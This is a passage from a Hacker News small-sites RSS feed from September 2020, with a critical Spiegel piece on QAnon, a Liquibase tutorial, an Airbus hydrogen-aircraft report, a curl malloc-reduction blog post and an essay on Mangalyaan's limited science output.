Rhine-Westphalia classifies her as a member of the Reichsb√ºrger (or "citizens of the Reich‚Äù) scene, a group that does not believe in the legitimacy of the modern German state.</p><p>Large U.S. tech companies have played a decisive role in the dissemination of the ideology. QAnon would not have been able to spread as fast and far around the world without YouTube, Facebook, Twitter and other social networks. During the coronavirus pandemic and in the first lockdowns in February, the ideology spread even more rapidly, especially in Germany. QAnon has been like a second virus spreading around the world, but this one is very definitely man-made.</p>
</div>

<div>
<p>It is no accident that Trump‚Äôs campaign team has recognized QAnon disciples as an important part of his base and is catering to them. Indeed, several Republican candidates for Congress have professed their affiliation to the movement.</p><p>The QAnon ideology, the first to emerge in the 21st century, is like a blend of video game and online treasure hunt, and emerged on a rather noxious platform that caters largely to young men: 4chan, a simple web forum that was founded in 2003 by a 15-year-old programmer from New York.</p><p><strong>4chan is essentially</strong> a giant digital pinboard with virtually no oversight. Anyone can write and post pretty much anything they want, always anonymously. Only very few things are not allowed and are then deleted. Its offerings include hardcore pornography, as well as tasteless, insulting or right-wing extremist speech. It has given birth to both good and repulsive ideas, which are then commented on and discussed - before immediately being overwhelmed by new posts and ideas.</p><p>4chan‚Äôs roots are in the Japanese manga scene. First-time visitors to the platform will struggle to make sense of its hundreds of discussion groups, manga photos and inside jokes. There are hundreds of thousands of entries every day, supposedly 27 million visitors per month. A unique language has emerged almost without any oversight that, like the jokes, is incomprehensible to outsiders. Thus far, there have been 3.5 billion entries. Users are bound together by the belief that they are part of one of the last bastions of free speech and opinion.</p><p>On October 28, 2017, an anonymous user on 4chan posted the following message: "Hillary Clinton will be arrested between 7:45 AM ‚Äì 8:30 AM EST on Monday ‚Äì the morning of Oct 30, 2017." The author signed later entries with the letter "Q.‚Äù It was the movement's Big Bang, launched by a false prediction. Clinton wasn‚Äôt arrested on October 30th, nor has she been arrested since, but the curiosity of users was piqued.</p><p>Author and conspiracy-theory researcher Timothy Melley at the University of Miami says many Americans are familiar with the elements of the QAnon movement. "It is like a detective novel, where you always inch closer to the truth.‚Äù Q has been posting increasingly complex entries since fall 2017, called "drops‚Äù by followers. These entries contain so-called "breadcrumbs‚Äù that must be followed to reach the goal. Which is ultimately unattainable.</p><p>Q‚Äôs breadcrumbs are like seeds, out of which the stories about the alleged elite conspiracy grow almost by themselves. Q is asking his or her (or their) followers to do their own research if they do not believe the media, turning conspiracy theorists into investigators. Melley argues that the desire to be a part of a revelation keeps them going, even if they never prove anything, and merely keep finding new breadcrumbs.</p>
</div>
<section>
<div data-component="HTMLEmbed">

<p>Illustration: Iris Kuhlmann / DER SPIEGEL; Fotos: Getty Images (3); klaput.blogspot.com; Twitter; wilkowmajority.com; YouTube.</p>
</div>
</section>
<div>
<p>The participatory nature of the ideology is what makes it so attractive. Melley argues that QAnon blends two big conspiracy theories together: a belief that the Illuminati, or someone else, rules the world and that there is a "deep state‚Äù within the government that is ‚Ä¶</p></div></div></section></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.spiegel.de/international/world/the-most-dangerous-cult-of-our-times-qanon-s-inexorable-spread-beyond-the-u-s-a-e2b13c80-246a-43e5-945b-80ad7767a170">https://www.spiegel.de/international/world/the-most-dangerous-cult-of-our-times-qanon-s-inexorable-spread-beyond-the-u-s-a-e2b13c80-246a-43e5-945b-80ad7767a170</a></em></p>]]>
            </description>
            <link>https://www.spiegel.de/international/world/the-most-dangerous-cult-of-our-times-qanon-s-inexorable-spread-beyond-the-u-s-a-e2b13c80-246a-43e5-945b-80ad7767a170</link>
            <guid isPermaLink="false">hacker-news-small-sites-24577419</guid>
            <pubDate>Thu, 24 Sep 2020 11:13:35 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Database Version Control with Liquibase]]>
            </title>
            <description>
<![CDATA[
Score 100 | Comments 79 (<a href="https://news.ycombinator.com/item?id=24577239">thread link</a>) | @asafg6
<br/>
September 24, 2020 | https://www.turtle-techies.com/database-version-controler-with-liquibase/ | <a href="https://web.archive.org/web/*/https://www.turtle-techies.com/database-version-controler-with-liquibase/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>
        
        <h4>Introduction to managing DB shcema changes with Liquibase</h4>
                <h6>
                    By Suresh Regmi, Published 2020-09-06
                </h6>
    </p><div itemprop="articleBody"><h2 id="motivation">Motivation</h2>
<p>Let me give you a scenario,<br>
You have a project with multiple database instances in different environments (Dev, QA, Production) and you need to manage the database schema changes that are done against those environments.
Let‚Äôs assume that you are managing those changes by creating a git project or a shared file on a drive and adding a new SQL file for each database changes you are doing.
To implement your changes in that database, for each SQL file, you need to run the changes in each environment manually and add a flag or note to indicate which change is run on which environment.<br>
Would it be able to complete your task?
Yes, Yet, is it a decent method to manage schema changes?<br>
Of Course Not.</p>
<h2 id="here-are-some-of-the-many-problems-you-might-face-while-doing-so">Here are some of the many problems you might face while doing so</h2>
<ol>
<li>Hard to synchronize database and application code changes in different environments</li>
<li>The tedious process to run each change manually in different environments</li>
<li>Collaboration across the development team on what change is deployed and what is not</li>
<li>Hard to roll-back to the previous version of the database</li>
<li>Possibility of data loss</li>
</ol>
<h2 id="here-comes-liquibase">Here comes Liquibase</h2>
<p>Liquibase is an open-source library for tracking and managing database schema changes that can be used for any database with a JDBC driver.<br>
It is a platform-independent database migration tool that allows the database changes referred to as ‚Äòchangesets‚Äô to be written in various formats including XML, JSON, YAML, and SQL.</p>
<h2 id="features">Features</h2>
<ol>
<li>Supports almost all databases that have a JDBC driver.</li>
<li>Changesets can be written in different formats like XML, JSON, YAML, and SQL.</li>
<li>Can be used to automatically generate changesets for an existing database</li>
<li>Easy to integrate with build tools like Jenkins, Maven etc</li>
<li>Supports database rollbacks</li>
<li>Supports context-dependent logic allowing us to use global context and preconditions</li>
<li>Can be executed via command line, Apache Maven, Apache Ant, Spring Framework</li>
<li>Has feature to generate changeset from an existing database and can also generate schema difference as changesets</li>
</ol>
<h2 id="different-ways-to-run-liquibase">Different ways to run liquibase</h2>
<ol>
<li><strong>Embed liquibase with your app:</strong> Embedding liquibase with your application code will automatically deploy liquibase on the app startup.</li>
<li><strong>Run liquibase using build tools:</strong> Integrate liquibase into your build process (with build tools like Jenkins, Ant, Maven, and Gradle) and update them without being tied up with the application.</li>
<li><strong>Generate the SQL and run it manually:</strong> Using update SQL, Liquibase provides the SQL generated from the changeset along with the database changes required to keep the tracking tables up to date. DBA will then inspect the SQL and run them against the database.</li>
</ol>
<h2 id="installation-process">Installation Process</h2>
<p><strong>Prerequisites:</strong> Liquibase requires Java 8+</p>
<p>There are two ways to install Liquibase, Manual installation and using liquibase installer.</p>
<p>If you set up liquibase using the liquibase installer, dependencies, directories, config and properties files will all be in place already.
It also provides some examples which will provide you with the core concepts required to understand the changesets.</p>
<p>In the case of manual installation, you need to download the compressed liquibase file and extract it in your workspace.<br>
For windows users, you need to add a new <code>PATH</code> variable in the <code>Environment Variables</code>.<br>
For macOS users, the path should be added to the <code>bash.profile</code> file.</p>
<p>For detailed instruction on Installation please follow this <a href="https://docs.liquibase.com/concepts/installation/home.html" target="_blank"> document </a>.</p>
<h2 id="core-concepts">Core Concepts</h2>
<ol>
<li><strong>liquibase.properties:</strong> The file <code>liquibase.properties</code> is a text-based file that stores common properties like database connection parameters, driver details, classpath parameters, global changelog parameters etc.
If you install liquibase using liquibase installer, it will provide pre-written <code>liquibase.properties</code> file while in case of manual installation, you need to create <code>liquibase.properties</code> file using a sample file provided.</li>
</ol>
<p><a href="https://www.turtle-techies.com/database-version-controler-with-liquibase/image01.png" target="_blank"><img src="https://www.turtle-techies.com/database-version-controler-with-liquibase/image01.png" alt="Sample liquibase.properties file for Oracle"></a></p>
<ol start="2">
<li><strong>DatabaseChangeLog:</strong> Databasechangelog is a file where all changesets go. Each database changelog can include one or more changesets.</li>
</ol>
<p><a href="https://www.turtle-techies.com/database-version-controler-with-liquibase/image02.png" target="_blank"><img src="https://www.turtle-techies.com/database-version-controler-with-liquibase/image02.png" alt="Example of an empty DatabaseChangeLog file
"></a></p>
<ol start="3">
<li><strong>Changeset:</strong> In liquibase, a changeset is represented as an atomic change to the database. Each changeset should be uniquely identified using author and id fields.
The database handles each changeset as a single transaction.
Changesets can be written in JSON, XML, SQL and YAML formats.</li>
</ol>
<p><a href="https://www.turtle-techies.com/database-version-controler-with-liquibase/image03.png" target="_blank"><img src="https://www.turtle-techies.com/database-version-controler-with-liquibase/image03.png" alt="Example of a changeset in XML format"></a></p>
<ol start="4">
<li><strong>DATABASECHANGELOG &amp; DATABASECHANGELOGLOCK:</strong> These two tables are created by liquibase to track the changes that are run against the database and to make sure that no other migrations age going on.</li>
</ol>
<p><a href="https://www.turtle-techies.com/database-version-controler-with-liquibase/image04.png" target="_blank"><img src="https://www.turtle-techies.com/database-version-controler-with-liquibase/image04.png" alt="DATABASECHANGELOG table structure"></a></p>
<p><a href="https://www.turtle-techies.com/database-version-controler-with-liquibase/image05.png" target="_blank"><img src="https://www.turtle-techies.com/database-version-controler-with-liquibase/image05.png" alt="DATABASECHANGELOGLOCK table structure"></a></p>
<h2 id="what-if-i-dont-like-liquibase">What if I don‚Äôt like Liquibase?</h2>
<p>If you told me that you don‚Äôt like liquibase and are looking for alternatives, I would ask why not Liquibase first.<br>
Liquibase is a sophisticated tool for database migration that has all features that you need for professional database refactoring and versioning.</p>
<p>But still, if you don‚Äôt want to use liquibase, here are some alternatives.</p>
<ol>
<li>
<p><strong>Flyway:</strong> Flyway is an open-source Apache licenced tool for database migration where you can write migrations in database-specific SQL or using Java code. For more details on Flyway, you can refer to this website. <a href="https://flywaydb.org/">https://flywaydb.org/</a></p>
</li>
<li>
<p><strong>YUNIQL:</strong> YUNIQL is also an open-source schema versioning and database migration engine that uses plain SQL scripts which can be integrated with CI/CD pipelines. If you want to check out YUNIQL, you can refer to this website. <a href="https://yuniql.io/">https://yuniql.io/</a></p>
</li>
</ol>
</div></div>]]>
            </description>
            <link>https://www.turtle-techies.com/database-version-controler-with-liquibase/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24577239</guid>
            <pubDate>Thu, 24 Sep 2020 10:43:42 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Airbus to launch hydrogen-powered commercial aircraft by 2035]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24577226">thread link</a>) | @artagnon
<br/>
September 24, 2020 | https://www.rfi.fr/en/france/20200921-airbus-to-launch-hydrogen-powered-commercial-aircraft-by-2035 | <a href="https://web.archive.org/web/*/https://www.rfi.fr/en/france/20200921-airbus-to-launch-hydrogen-powered-commercial-aircraft-by-2035">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>
                    Airbus has announced its aim to put the world's first hydrogen-powered commercial aircraft into service by 2035.
                </p><div>
                    
                                        <p>"This is a historic moment for the commercial aviation sector as a whole and we intend to play a leading role in the most important transition this industry has ever seen,"&nbsp;Guillaume Faury, Airbus CEO said.</p><p>"The concepts we unveil today offer the world a glimpse of our ambition to drive a bold vision for the future of zero-emission flight."</p><p>Airbus‚Äô hydrogen technology will be demonstrated in three concept aircrafts called Zeroe: a turboprop (up to 100 passengers), a turbo fan (100 to 200 passengers) and a blended wing body (up to 200 passengers).</p><p>Speaking in a web telecast, Grazia Vittadini, chief technology officer of Airbus, explained the reason behind the choice of hydrogen for the zero emissions program.</p><p><strong>Hydrogen's flexibility</strong></p><p>‚ÄúHydrogen can be combusted directly through modified gas turbines. It can also be converted into electric energy thanks to fuel cells and when combined with CO2 hydrogen can be used to produce synthetic kerosene,‚Äù she said.</p><p>She added Airbus would&nbsp;focus on combining the first two elements.</p>                
    <p>‚ÄúThis means having direct combustion of hydrogen through modified gas turbines with an embedded electric motor powered by fuel cells.‚Äù</p><p>She also listed hydrogen‚Äôs other key advantage. ‚ÄúHydrogen has the same energy level as kerosene that enables it to deliver same kind of range and performance with one third of the weight.‚Äù</p><p>She remarked that the first flight demonstrator of a hydrogen aircraft is expected to be in 2025.</p><p>The French government has earmarked 1.5 billion euros for the development of carbon-free aircraft as part of a support plan for the aviation sector, with other European countries&nbsp;supporting the growth of &nbsp;hydrogen technology.</p>
                                            
    
                </div></div>]]>
            </description>
            <link>https://www.rfi.fr/en/france/20200921-airbus-to-launch-hydrogen-powered-commercial-aircraft-by-2035</link>
            <guid isPermaLink="false">hacker-news-small-sites-24577226</guid>
            <pubDate>Thu, 24 Sep 2020 10:42:05 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Reducing mallocs for fun]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24577129">thread link</a>) | @headalgorithm
<br/>
September 24, 2020 | https://daniel.haxx.se/blog/2020/09/24/reducing-mallocs-for-fun/ | <a href="https://web.archive.org/web/*/https://daniel.haxx.se/blog/2020/09/24/reducing-mallocs-for-fun/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<p>Everyone needs something fun to do in their spare time. And digging deep into curl internals is mighty fun!</p>



<p>One of the things I do in curl every now and then is to run a few typical command lines and count how much memory is allocated and how many memory allocation calls that are made. This is good project hygiene and is a basic check that we didn‚Äôt accidentally slip in a malloc/free sequence in the transfer path or something.</p>



<p>We have extensive memory checks for leaks etc in the test suite so I‚Äôm not worried about that. Those things we detect and fix immediately, even when the leaks occur in error paths ‚Äì thanks to our fancy ‚Äútorture tests‚Äù that do error injections.</p>



<p>The amount of memory needed or number of mallocs used is more of a <a href="https://en.wikipedia.org/wiki/Boiling_frog">boiling frog problem</a>. We add one now, then another months later and a third the following year. Each added malloc call is motivated within the scope of that particular change. But taken all together, does the pattern of memory use make sense? Can we make it better?</p>



<h2>How?</h2>



<p>Now this is easy because when we build curl debug enabled, we have a fancy logging system (we call it <em>memdebug</em>) that logs all calls to ‚Äúfallible‚Äù system functions so after the test is completed we can just easily grep for them and count. It also logs the exact source code and line number.</p>



<pre>cd tests
./runtests -n [number]
egrep -c 'alloc|strdup' log/memdump</pre>



<h2>Let‚Äôs start</h2>



<p>Let me start out with a look at the history and how many allocations (calloc, malloc, realloc or strdup) we do to complete test 103. The reason I picked 103 is somewhat random, but I wanted to look at FTP and this test happens to do an ‚Äúactive‚Äù transfer of content and makes a total of 10 FTP commands in the process.</p>



<p>The reason I decided to take a closer look at FTP this time is because I fixed an issue in the main ftp source code file the other day and that made me remember the <code>Curl_pp_send()</code> function we have. It is the function that sends FTP commands (and IMAP, SMTP and POP3 commands too, the family of protocols we refer to as the ‚Äúping pong protocols‚Äù internally because of their command-response nature and that‚Äôs why it has ‚Äúpp‚Äù in the name).</p>



<p>When I reviewed the function now with my malloc police hat on, I noticed how it made two calls to aprintf(). Our printf version that returns a freshly malloced area ‚Äì which can even cause several reallocs in the worst case. But this meant <em>at least </em>two mallocs per issued command. That‚Äôs a bit unnecessary, isn‚Äôt it?</p>



<h2>What about a few older versions</h2>



<p>I picked a few random older versions, checked them out from git, built them and counted the number of allocs they did for test 103:</p>



<pre>7.52.1: 141<br>7.68.0: 134<br>7.70.0: 137<br>7.72.0: 123</pre>



<p>It‚Äôs been up but it has gone down too. Nothing alarming, Is that a good amount or a bad amount? We shall see‚Ä¶</p>



<h2>Cleanup step one</h2>



<p>The function gets printf style arguments and sends them to the server. The sent command also needs to append CRLF to the data. It was easy to make sure the CRLF appending wouldn‚Äôt need an extra malloc. That was just sloppy of us to have there in the first place. Instead of mallocing the new printf format string with CRLF appended, it could use one in a stack based buffer. I landed that as a <a href="https://github.com/curl/curl/commit/0548ecaf6ac6fd8d81d63048d09ece8dbb715666">first commit</a>.</p>



<p>This trimmed off 10 mallocs for test 103.</p>



<h2>Step two, bump it up a notch</h2>



<p>The remaining malloc allocated the memory block for protocol content to send. It can be up to several kilobytes but is usually just a few bytes. It gets allocated in case it needs to be held on to if the entire thing cannot be sent off over the wire immediately. Remember, curl is non-blocking internally so it cannot just sit waiting for the data to get transferred.</p>



<p>I switched the malloc‚Äôed buffer to instead use a ‚Äòdynbuf‚Äô. That‚Äôs our internal ‚Äúdynamic buffer‚Äù system that was <a href="https://github.com/curl/curl/commit/ed35d6590e72c23c568af1e3b8ac6e4e2d883888#diff-8990ac09ce8abcb4f5e90a8f210ae11c">introduced earlier this year</a> and that we‚Äôre gradually switching all internals over to use instead of doing ‚Äúcustom‚Äù buffer management in various places. <a href="https://github.com/curl/curl/blob/master/docs/DYNBUF.md">The internal API for dynbuf is documented here</a>.</p>



<p>The internal API <code>Curl_dyn_addf()</code> adds a printf()-style string at the end of a ‚Äúdynbuf‚Äù, and it seemed perfectly suitable to use here. I only needed to provide a <code>vprintf()</code> alternative since the printf() format was already received by <code>Curl_pp_sendf()</code>‚Ä¶ I created <code>Curl_dyn_vaddf()</code> for this.</p>



<p>This single dynbuf is kept for the entire transfer so that it can be reused for subsequent commands and grow only if needed. Usually the initial 32 bytes malloc should be sufficient for all commands.</p>



<h2>Not good enough</h2>



<p>It didn‚Äôt help!</p>



<p>Counting the mallocs showed me with brutal clarity that my job wasn‚Äôt done there. Having dug this deep already I wasn‚Äôt ready to give this up just yet‚Ä¶</p>



<p>Why? Because <code>Curl_dyn_addf()</code> was still doing a separate alloc of the printf string that it then appended to the dynamic buffer. But okay, having <a href="https://github.com/curl/curl/blob/master/lib/mprintf.c">our own printf() implementation</a> in the code has its perks.</p>



<h2>Add a printf() string without extra malloc</h2>



<p>Back in <a href="https://github.com/curl/curl/commit/ed35d6590e72c23c568af1e3b8ac6e4e2d883888#diff-8990ac09ce8abcb4f5e90a8f210ae11c">May 2020</a> when I introduced this dynbuf thing, I converted the aprintf() code over to use dynbuf to truly unify our use of dynamically growing buffers. That was a main point with it after all.</p>



<p>As all the separate individual pieces I needed for this next step were already there, all I had to do was to add a new entry point to the printf() code that would accept a dynbuf as input and write directly into that (and grow it if needed), and then use that new function (<code>Curl_dyn_vprintf</code>) from the Curl_dyn_addf().</p>



<p>Phew. Now let‚Äôs see what we get‚Ä¶</p>



<p>There are 10 FTP commands that previously did 2 mallocs each: 20 mallocs were spent  in this function when test 103 was executed. Now we are down to the ideal case of one alloc in there for the entire transfer.</p>



<h2>Test 103 after polish</h2>



<p>The code right now in master (to eventually get released as 7.73.0 in a few weeks), now shows <strong>a total of 104 allocations</strong>. Down from 123 in the previous release, which not entirely surprising is 19 fewer and thus perfectly matching the logic above.</p>



<p>All tests and CI ran fine. <a href="https://github.com/curl/curl/commit/675eeb1c941706070381faaad8ee1a5d75cff4a4">I merged it</a>. This is a change that benefits all transfers done with any of the ‚Äúping pong protocols‚Äù. And it also makes the code easier to understand!</p>



<p>Compared to curl 7.52.1, this is a 26% reduction in number of allocation; pretty good, but even compared to 7.72.0 it is still a 15% reduction.</p>



<h2>More?</h2>



<p>There is always more to do, but there‚Äôs also a question of diminishing returns. I will continue to look at curl‚Äôs memory use going forward too and make sure everything is motivated and reasonable. At least every once in a while.</p>



<p>I have some additional ideas for further improvements in the memory use area to look into. We‚Äôll see if they pan out‚Ä¶</p>



<p>Don‚Äôt count on me to blog about every such finding with this level of detail! If you want to make sure you don‚Äôt miss any of these fine-tunes in the future, follow <a href="https://github.com/curl/curl">the curl github repo</a>.</p>



<h2>Credits</h2>



<p>Image by <a href="https://pixabay.com/users/orzalaga-77630/?utm_source=link-attribution&amp;utm_medium=referral&amp;utm_campaign=image&amp;utm_content=1837434">Julio C√©sar Vel√°squez Mej√≠a</a> from <a href="https://pixabay.com/?utm_source=link-attribution&amp;utm_medium=referral&amp;utm_campaign=image&amp;utm_content=1837434">Pixabay</a></p>
	</div></div>]]>
            </description>
            <link>https://daniel.haxx.se/blog/2020/09/24/reducing-mallocs-for-fun/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24577129</guid>
            <pubDate>Thu, 24 Sep 2020 10:22:20 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[India‚Äôs Mars orbiter completes 6 years at the red planet. Where is the science?]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 2 (<a href="https://news.ycombinator.com/item?id=24576962">thread link</a>) | @uncertainquark
<br/>
September 24, 2020 | https://jatan.space/missing-science-from-mangalyaan/ | <a href="https://web.archive.org/web/*/https://jatan.space/missing-science-from-mangalyaan/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<div><figure><img loading="lazy" width="817" height="543" src="https://i2.wp.com/jatan.space/wp-content/uploads/2020/09/mom-cover.jpg?resize=817%2C543&amp;ssl=1" alt="" srcset="https://i2.wp.com/jatan.space/wp-content/uploads/2020/09/mom-cover.jpg?w=817&amp;ssl=1 817w, https://i2.wp.com/jatan.space/wp-content/uploads/2020/09/mom-cover.jpg?resize=200%2C133&amp;ssl=1 200w, https://i2.wp.com/jatan.space/wp-content/uploads/2020/09/mom-cover.jpg?resize=768%2C510&amp;ssl=1 768w" sizes="(max-width: 817px) 100vw, 817px" data-recalc-dims="1"><figcaption>Artist‚Äôs impression of the Mangalyaan spacecraft. Credit: ISRO</figcaption></figure></div>



<p>This September 24 marks six years since ISRO‚Äôs Mangalyaan spacecraft entered Mars orbit, making India the first Asian country to do so. What is even more impressive is that Mangalyaan was the country‚Äôs first interplanetary mission. Combined with the cost effectiveness for which it is lauded, Mangalyaan is often hailed as India‚Äôs most successful space mission. But is it?</p>



<h3><strong>Mangalyaan‚Äôs missing Science</strong></h3>



<p>The Indian Prime Minister, Narendra Modi, has <a href="https://www.hindustantimes.com/india/modi-steals-the-show-with-mom-speech/story-InpN3lWUPODF6OURjabTgJ.html">boasted</a> that at ~$70 million, the mission was cheaper than the Hollywood film <em>Gravity</em>, and even an <em>auto rickshaw</em> (taxi-equivalent) ride on a fare-per-kilometer basis. The media highlighted Mangalyaan‚Äôs cost effectiveness too, noting that NASA‚Äôs MAVEN orbiter to Mars, launched around the same time, had cost about seven times more.</p>



<p>India‚Äôs pride in the mission while downplaying others has continued to spread over the years, also taking the form of dramatized movies like <a href="https://www.imdb.com/title/tt9248972/">Mission Mangal</a>. But what they all miss is looking at the science output i.e. what has Mangalyaan been doing in Mars orbit?</p>



<p>According to ISRO‚Äôs official <a href="https://www.isro.gov.in/sites/default/files/mom-list-of-publications-sept2019.pdf">list of publications</a>, there have been only 27 peer-reviewed papers relating to Mangalyaan, after six years in orbit. In contrast, MAVEN has helped produce many <a href="https://jatan.space/nasa-maven-mars-orbiter/">seminal scientific results</a> about the martian atmosphere, with a repository of <a href="https://ui.adsabs.harvard.edu/search/q=((MAVEN%20spacecraft)%20AND%20year%3A2012-2021)%20full%3A%22mars%22&amp;sort=date%20desc%2C%20bibcode%20desc&amp;p_=0">at least 500</a> papers and growing. What‚Äôs more concerning about Mangalyaan‚Äôs short publications list is that about half of those are simply engineering descriptions of the mission, not scientific results <em>from</em> the mission.</p>



<p>Naysayers may dismiss the lack of science by arguing that Mangalyaan was a ‚Äòtechnology demonstration‚Äô mission, aimed at proving ISRO‚Äôs interplanetary mission capabilities. That may be part of it but that‚Äôs not how ISRO marketed the mission pre and post launch, when it was vocal about the science goals.</p>



<p>ISRO has made data from Mangalyaan‚Äôs five indigenous <a href="https://www.isro.gov.in/announcement-of-opportunity-utilising-mars-orbiter-mission-data-mcc-tis-msm-lap-and-menca-payloads-1">science instruments</a> available on their <a href="https://mrbrowse.issdc.gov.in/MOMLTA/">data portal</a> for five years now, and has <a href="https://www.isro.gov.in/pslv-c25-mars-orbiter-mission/announcement-of-opportunity-utilising-mars-orbiter-mission-data-mcc">explicitly welcomed</a> the Indian science community to publish papers. In 2017, ISRO <a href="https://www.isro.gov.in/mom-science-meet">announced</a> at the mission‚Äôs dedicated science meet that 32 research teams across the country are exploring and analyzing Mangalyaan data. And yet, there is a huge vacuum of publications.</p>







<p>Perhaps the most notable failure concerns the much-hyped methane sensor. The instrument was supposed to globally map methane with a sensitivity of parts per billion, to help decide if the methane on Mars could be a sign of subsurface life. But two years after launch, the instrument was found to <a href="https://www.seeker.com/india-mars-orbiter-mission-methane-detector-flaw-red-planet-2133861312.html">have a design flaw</a> and so it can‚Äôt detect methane at all. At that point, ISRO repurposed the methane sensor as an albedo mapper, which measures sunlight reflected from the surface to get hints about Mars‚Äô surface composition.</p>



<p>There also seem to be no published results from the Lyman Alpha Photometer. By looking for hydrogen escaping Mars‚Äô atmosphere, it was supposed to tell us how much water Mars lost since its birth and at what rate. Notably, NASA‚Äôs MAVEN spacecraft was also expected to deliver this result (by examining many more factors), and <a href="https://jatan.space/nasa-maven-mars-orbiter/">it delivered</a>.</p>



<h3><strong>The urge to be first</strong></h3>



<p>If the cost argument is to be made to justify some or any part of the missing science, ISRO‚Äôs own Chandrayaan 1 refutes it. At $54 million, it was cost effective too, and an equally challenging endeavor given that it was India‚Äôs first lunar orbiter.</p>



<p>Unlike Mangalyaan though, Chandrayaan 1 welcomed global collaboration ‚Äì&nbsp;about half the instruments came from foreign space agencies and universities. Notably, it was the two NASA instruments that confirmed the <a href="https://jatan.space/how-nasa-and-chandrayaan-discovered-water-on-the-moon/">discovery of water on the Moon</a>. Despite orbiting the Moon for less than a year, Chandrayaan 1 produced hundreds of publications and scientists are analyzing its data even today.</p>



<p>This is not to say that ISRO can‚Äôt build good science instruments but to point out that collaboration can be an effective way to increase mission science without increasing mission cost. For some reason, ISRO doesn‚Äôt even fly science instruments from universities and institutions within the country for its planetary missions. The only exception has been India‚Äôs first space telescope Astrosat whose instruments were selected as a consensus from academic institutions across the country. But that‚Äôs not planetary exploration per se, for which ISRO operates differently. ISRO does <a href="https://jatan.space/isro-welcomes-academia-companies-in-space-exploration-plans/">intend to change this method in the future</a> as part of its space commercialization initiative by involving private players and academic institutions.</p>



<p>Both the missing collaborations and lack of scientific output from Mangalyaan‚Äôs indigenous instruments may have to do with the mission‚Äôs development time, which was just 18 months. It‚Äôs unclear why ISRO was in such a hurry to launch in 2013 and couldn‚Äôt have targeted the 2016 launch opportunity instead. The reason may be political ‚Äì&nbsp;the urge to successfully orbit Mars before China or Japan does.</p>



<div><figure><img loading="lazy" width="1024" height="723" src="https://i2.wp.com/jatan.space/wp-content/uploads/2020/09/mom-launch.jpg?resize=1024%2C723&amp;ssl=1" alt="" srcset="https://i2.wp.com/jatan.space/wp-content/uploads/2020/09/mom-launch.jpg?resize=1024%2C723&amp;ssl=1 1024w, https://i2.wp.com/jatan.space/wp-content/uploads/2020/09/mom-launch.jpg?resize=200%2C141&amp;ssl=1 200w, https://i2.wp.com/jatan.space/wp-content/uploads/2020/09/mom-launch.jpg?resize=768%2C543&amp;ssl=1 768w, https://i2.wp.com/jatan.space/wp-content/uploads/2020/09/mom-launch.jpg?resize=1536%2C1085&amp;ssl=1 1536w, https://i2.wp.com/jatan.space/wp-content/uploads/2020/09/mom-launch.jpg?resize=1200%2C848&amp;ssl=1 1200w, https://i2.wp.com/jatan.space/wp-content/uploads/2020/09/mom-launch.jpg?w=1594&amp;ssl=1 1594w" sizes="(max-width: 1024px) 100vw, 1024px" data-recalc-dims="1"><figcaption>Launch of Mangalyaan onboard a PSLV rocket on November 5, 2013. <a href="https://www.isro.gov.in/pslv-c25-mars-orbiter-mission/pslv-c25-mars-orbiter-mission-gallery">Credit: ISRO</a></figcaption></figure></div>



<p>Had Mangalyaan been given enough time, the scientific instruments package likely wouldn‚Äôt have been restricted to the mere 15 kilograms, and the output could‚Äôve been substantial even with indigenous instruments. Case in point being ISRO‚Äôs Chandrayaan 2 orbiter which carries state-of-the-art instruments, all indigenous, and is <a href="https://jatan.space/chandrayaan-2-is-creating-the-highest-resolution-map-of-the-moon/">making the highest-resolution map</a> of the Moon and quantifying water on its poles as we speak.</p>



<p>Another way Mangalyaan‚Äôs value could‚Äôve been improved was if ISRO equipped it with a standard relay device, one that every NASA Mars orbiter carries. These orbiter relays allow NASA to get more science data from its surface missions than would be possible otherwise. The European Space Agency <a href="https://mars.nasa.gov/news/nasa-radio-delivered-for-europes-2016-mars-orbiter/">put one such device</a> for NASA on their Trace Gas Orbiter, launched in 2016. If ISRO had done that too, instead of <a href="https://twitter.com/MarsOrbiter/status/514618412417302528">talking to NASA‚Äôs Curiosity on Twitter</a>, Mangalyaan could‚Äôve talked to the real deal.</p>



<h3><strong>Missing space exploration roadmap</strong></h3>



<p>More than the quality of the science instruments or mission planning, Mangalyaan highlights the lack of an overarching philosophy guiding India‚Äôs planetary missions.<strong> </strong>In contrast, NASA has an elaborate process called <a href="https://www.nationalacademies.org/our-work/planetary-science-and-astrobiology-decadal-survey-2023-2032">the Decadal Survey</a> in which scientists from across the US present a consensus of prioritized space exploration destinations and scientific objectives once every decade. NASA uses the Decadal as a guide to build its missions, and the system therefore guarantees that said scientific goals are achieved more often than not. China and the European Space Agency have similar processes in place for their missions.</p>



<p>Space exploration missions are inherently costly undertakings, and at this point, the value per unit money matters as much as the absolute cost, if not more. MAVEN highlights this adequately. The mission, part of NASA‚Äôs larger Mars exploration program, is built with the express purpose of studying Mars‚Äô atmosphere and determining exactly how the red planet lost its water. Thanks to its clear objectives, MAVEN delivered big science&nbsp;while still costing NASA less than many of its other endeavors, even if costing more than Mangalyaan.</p>



<p>Like NASA‚Äôs other missions, MAVEN‚Äôs findings feed directly into the agency‚Äôs next steps in Mars exploration and planning of future habitats, further cementing the value-proposition of such a model. India could benefit immensely from a formal planetary exploration framework which either doesn‚Äôt exist or whose functioning is inept and unclear to the public.</p>



